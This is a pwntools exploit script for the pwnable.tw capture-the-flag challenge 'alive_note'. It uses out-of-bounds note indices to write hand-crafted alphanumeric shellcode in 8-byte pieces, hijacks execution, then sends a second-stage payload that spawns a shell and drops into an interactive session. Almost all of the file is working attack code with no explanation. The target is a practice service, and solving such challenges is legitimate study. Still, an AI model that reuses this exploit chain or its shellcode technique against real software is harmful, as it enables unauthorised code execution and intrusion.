#!/usr/bin/env python2
from pwn import *

exe = ELF("./alive_note")
context.binary = exe
context.terminal = "kitty sh -c".split()
#context.log_level = "debug"
IP, PORT = "chall.pwnable.tw", 10300

global io
breakpoints = '''
break *0x08048a7e
#break add_note
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

def add_note(offset,payload):
    reu(" :")
    s("1")
    reu(" :")
    s(str(offset))
    reu(" :")
    s(payload)

def bye():
    reu(" :")
    s("4")

def fill_junk():
    for i in range(3):
        add_note(-1,"{}".format(i+1)*8)

shellcode = """
    pop eax
    xor al,0x30
    xor al,0x35
    dec eax
    jne 0x38

    xor eax,0x70707050
    push edx
    jne 0x38

    xor eax,0x70705a30
    push edx
    jne 0x38

    xor ecx,[eax+0x61]
    pop eax
    xor al,0x4f
    jne 0x38

    push eax
    xor al,0x30
    push eax
    pop edx
    inc edx
    jne 0x38
    
    push edx
    pop eax
    xor al,0x78
    push eax
    pop edx
    jne 0x38

    xor byte ptr [ecx+0x44],dl
    xor byte ptr [ecx+0x45],dl
    jne 0x38

    pop eax
    xor al,0x4c
    inc edx
    \x35\x78 -> int 0x80
    jne 0x38
"""

shell1 = "X4045Hu8"
shell2 = "5PpppRu8"
shell3 = "50ZppRu8"
shell4 = "3HaX4Ou8"
shell5 = "P40PZBu8"
shell6 = "RX4xPZu8"
shell7 = "0QD0QEu8"
shell8 = "X4LB5xu8"


add_note(-23,shell1)

fill_junk()
add_note(-1,shell2)

fill_junk()
add_note(-1,shell3)

fill_junk()
add_note(-1,shell4)

fill_junk()
add_note(-1,shell5)

fill_junk()
add_note(-1,shell6)

fill_junk()
add_note(0,shell7)

fill_junk()
add_note(-1,shell8)

bye()

sl("A"*0x46+asm(shellcraft.sh()))
io.interactive()
